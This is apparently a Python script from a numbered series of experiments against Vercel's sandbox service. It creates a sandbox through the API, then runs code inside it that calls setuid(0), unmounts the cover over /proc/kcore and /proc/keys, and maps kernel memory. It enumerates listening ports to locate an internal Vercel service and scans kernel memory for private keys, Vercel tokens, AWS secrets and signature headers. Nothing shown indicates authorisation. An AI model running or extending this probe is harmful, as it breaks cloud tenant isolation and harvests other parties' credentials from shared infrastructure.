# 实验J175: kcore ELF段解析 + root下端口监听 + 内存搜索策略确定
# j174: setuid(0)成功 + umount /proc/kcore 后真实kcore可读(128TB ELF)
# 本步: 1)解析kcore ELF program headers -> 可读段布局(确定搜索范围)
#       2)root下 ss -tlnp 端口监听(找 Vercel interactive 服务)
#       3)小范围内存搜索验证(内核text段搜版本串)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=6000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj175"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# 阶段A: setuid(0) + kcore ELF 段解析 + 端口监听
PA = r'''
import os, ctypes, struct
out = open("/tmp/d175a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL("libc.so.6", use_errno=True)
if os.getuid() != 0:
    libc.setuid(0)
    p("setuid_again", os.getuid())

# 1. 先揭开 devtmpfs 覆盖层 (j174: umount后真实kcore可读)
libc.umount(b"/proc/kcore")
libc.umount(b"/proc/keys")

# 2. kcore ELF 解析 (pread不可用 -> lseek+read)
fd = os.open("/proc/kcore", os.O_RDONLY)
def rd_at(off, n):
    try:
        pos = os.lseek(fd, off, 0)
        if pos != off:
            return b"SEEKFAIL"
        return os.read(fd, n)
    except Exception as ex:
        return ("EXC:" + repr(ex)).encode()

head = rd_at(0, 64)
p("head_len", len(head), "head_hex", head[:16].hex())
if len(head) < 64:
    p("ELF_HEAD_READ_FAILED")
else:
    e_phoff = struct.unpack("<Q", head[32:40])[0]
    e_phentsize = struct.unpack("<H", head[54:56])[0]
    e_phnum = struct.unpack("<H", head[56:58])[0]
    p("phoff", hex(e_phoff), "phentsize", e_phentsize, "phnum", e_phnum)
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        h = rd_at(off, 56)
        if len(h) < 56:
            p("ph_read_fail", i, len(h))
            break
        p_type, p_flags = struct.unpack("<II", h[0:8])
        p_offset = struct.unpack("<Q", h[8:16])[0]
        p_vaddr = struct.unpack("<Q", h[16:24])[0]
        p_filesz = struct.unpack("<Q", h[32:40])[0]
        p_memsz = struct.unpack("<Q", h[40:48])[0]
        if p_type == 1:
            p("LOAD", "flags", p_flags, "fileoff", hex(p_offset), "vaddr", hex(p_vaddr),
              "filesz", hex(p_filesz), "memsz", hex(p_memsz))
os.close(fd)

# 3. 端口监听 (无ss/netstat -> 直接解析 /proc/net/*)
def parse_net(fn):
    try:
        with open(fn) as fh:
            lines = fh.read().splitlines()[1:]
        out = []
        for ln in lines:
            parts = ln.split()
            if len(parts) < 10:
                continue
            st = int(parts[3], 16)
            if st != 0x0A:  # LISTEN
                continue
            laddr, lport = parts[1].split(":")
            ip = ".".join(str(int(laddr[i:i+2], 16)) for i in range(6, -1, -2))
            out.append((ip, int(lport, 16), parts[9]))
        return out
    except Exception as ex:
        return ["EXC:" + repr(ex)]
for fn in ["/proc/net/tcp", "/proc/net/tcp6", "/proc/net/udp", "/proc/net/udp6"]:
    p("NET", fn, parse_net(fn))

# 4. 内核 cmdline / version
for f in ["/proc/cmdline", "/proc/version"]:
    try:
        with open(f) as fh:
            p("file", f, fh.read()[:300])
    except Exception as ex:
        p("file_err", f, repr(ex))
p("=== A_DONE")
out.close()
'''

# 阶段B: 小范围搜索验证 - 内核text段搜 "Linux version" + 内存中搜 "vcp_"/"BEGIN" 统计
PB = r'''
import os, ctypes, struct
out = open("/tmp/d175b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL("libc.so.6", use_errno=True)
if os.getuid() != 0:
    libc.setuid(0)
libc.umount(b"/proc/kcore")

fd = os.open("/proc/kcore", os.O_RDONLY)
def rd_at(off, n):
    pos = os.lseek(fd, off, 0)
    if pos != off:
        return b""
    return os.read(fd, n)

head = rd_at(0, 64)
e_phoff = struct.unpack("<Q", head[32:40])[0]
e_phentsize = struct.unpack("<H", head[54:56])[0]
e_phnum = struct.unpack("<H", head[56:58])[0]
segs = []
for i in range(e_phnum):
    off = e_phoff + i * e_phentsize
    h = rd_at(off, 56)
    p_type = struct.unpack("<I", h[0:4])[0]
    if p_type != 1:
        continue
    p_flags = struct.unpack("<I", h[4:8])[0]
    p_offset = struct.unpack("<Q", h[8:16])[0]
    p_vaddr = struct.unpack("<Q", h[16:24])[0]
    p_filesz = struct.unpack("<Q", h[32:40])[0]
    segs.append((p_flags, p_offset, p_vaddr, p_filesz))

# 只扫前2个LOAD段的前128MB验证搜索管道
patterns = [b"Linux version", b"BEGIN PRIVATE KEY", b"BEGIN RSA", b"vcp_", b"AWS_SECRET", b"x-signature"]
scanned = 0
for flags, off0, vaddr, fsz in segs[:2]:
    limit = min(fsz, 128 * 1024 * 1024)
    chunk = 8 * 1024 * 1024
    pos = 0
    while pos < limit:
        d = rd_at(off0 + pos, chunk)
        if not d:
            break
        for pat in patterns:
            idx = d.find(pat)
            if idx >= 0:
                ctx = d[max(0, idx - 20):idx + 80]
                p("HIT", pat.decode(), hex(vaddr + pos + idx), ctx.hex()[:160])
        scanned += len(d)
        pos += len(d)
p("scanned", scanned)
os.close(fd)
p("=== B_DONE")
out.close()
'''

steps = [
    ("kcore-parse", "/tmp/d175a.txt", PA),
    ("mem-scan-probe", "/tmp/d175b.txt", PB),
]
for label, marker, code in steps:
    st = run_cmd(sid, code, label, timeout=280)
    time.sleep(2)
    cf = catfile(sid, marker, f"marker[{label}]", 6000)
    if st == "DEAD" or cf == 410:
        print(f"\n!!! DEATH after cmd[{label}] -> trigger = {label}", flush=True)
        break

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
